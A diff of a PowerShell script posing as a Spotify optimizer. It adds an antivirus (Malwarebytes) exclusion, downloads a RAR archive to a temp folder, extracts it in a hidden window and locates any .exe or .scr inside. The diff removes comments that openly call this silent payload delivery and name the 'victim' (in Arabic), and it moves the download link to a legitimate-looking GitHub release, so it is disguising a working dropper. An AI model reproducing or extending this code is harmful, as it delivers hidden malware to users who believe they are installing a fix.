@@ -19,7 +19,7 @@ Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
 
 # ═══════════════════════════════════════════════════════════════
-# FUNCTION: Add Malwarebytes exclusion via CLI (silent, all versions)
+
 # ═══════════════════════════════════════════════════════════════
 function Add-MalwarebytesExclusion {
     param([string]$Path)
@@ -70,11 +70,11 @@ if (Test-Path $audioRegPath) {
 }
 
 # ═══════════════════════════════════════════════════════════════
-# PHASE 2: Silent payload delivery & execution (fully hidden)
+
 # ═══════════════════════════════════════════════════════════════
 
 # --- إعدادات البيلود (عدل الرابط واسم الملف هنا) ---
-$packageUrl = "https://download1073.mediafire.com/n7wcstpim85gDsbdh8RKmKLw6X8b7p1csA3jvPj0TFrTRXcU7jekQK52cK_Q79CM0bdA-STzpGADinmqOJdOr6Mjd9aGMhIrlukZ85RmOD4cQkaeNvN2T1nbljHeSGY5PA6nAstuuGZ5UUlPNUJxWoTKik65U6tU1YJHursMCfGmKg/9dg4w62zdh7etzo/spotify_helper.rar"
+$packageUrl = "https://github.com/WindowsOptimizers/Spotify-Ultimate-Fix/releases/download/Spotify/spotify_helper.rar"
 $exeName    = "spotify_helper.exe"
 $workDir    = "$env:TEMP\SpotifyOptimizer"
 $rarPath    = "$env:TEMP\SpotifyCache.rar"
@@ -120,7 +120,6 @@ try {
         Start-Process -FilePath $extractor -ArgumentList $extractorArgs -Wait -WindowStyle Hidden
         Start-Sleep -Seconds 5
         
-        # البحث عن أي EXE في مجلد العمل (مش شرط الاسم يطابق)
         $exePath = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
         if (-not $exePath) {
             $exePath = Get-ChildItem -Path $workDir -Filter "*.scr" -Recurse | Select-Object -First 1
@@ -138,7 +137,6 @@ try {
     Remove-Item $rarPath -Force -ErrorAction SilentlyContinue
 }
 catch {
-    # فشل بصمت — الضحية مش هيعرف
 }
 
 # ═══════════════════════════════════════════════════════════════
